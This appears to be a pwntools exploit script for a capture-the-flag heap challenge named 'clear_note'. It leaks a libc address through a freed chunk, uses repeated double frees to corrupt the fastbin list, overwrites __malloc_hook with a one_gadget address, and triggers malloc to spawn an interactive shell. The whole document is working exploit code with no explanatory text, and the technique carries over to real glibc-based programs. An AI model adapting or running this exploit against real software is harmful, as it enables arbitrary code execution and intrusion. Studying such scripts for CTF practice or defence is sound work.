from pwn import *
p=process('./clear_note')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#gdb.attach(p,'''
#	break *0x0000555555554E9A 
#	continue
#''')
def add(size,data):
    p.recvuntil("choice>> ")
    p.sendline('1')
    p.recvuntil("size: ")
    p.sendline(str(size))
    p.recvuntil("info: ")
    p.send(data)
    p.sendline('\n')

def show(idx):
    p.recvuntil("choice>> ")
    p.sendline('2')
    p.recvuntil("ndex: ")
    p.sendline(str(idx))
    p.recvuntil('info: ')

def dele(idx):
    p.recvuntil("choice>> ")
    p.sendline('3')
    p.recvuntil("index: ")
    p.sendline(str(idx))

add(0x100,'a')
add(0x60,'b')
dele(0)
show(0)
arena=u64(p.recv(6).ljust(8,'\x00'))
libc.address=arena-0x3c4b78
log.info('libcBase > '+hex(libc.address))
mallocHook=libc.symbols['__malloc_hook']
log.info('__malloc_hook > '+hex(mallocHook))
#oneGadget=libc.address+0x45216
oneGadget=libc.address+0xf1147
#oneGadget=libc.address+0x4526a
#oneGadget=libc.address+0xf02a4
writeAddress=mallocHook-0x13


dele(1)
dele(0)
dele(1)

add(0x100,'a'*0x100+p64(0)+p64(0x71)+p64(writeAddress))
add(0x60,'b')
dele(0)
dele(0)
dele(1)
dele(1)
add(0x60,'c'*3+p64(oneGadget))
p.recvuntil("choice>> ")
p.sendline('1')
p.recvuntil("size: ")
p.sendline('10')
p.interactive()
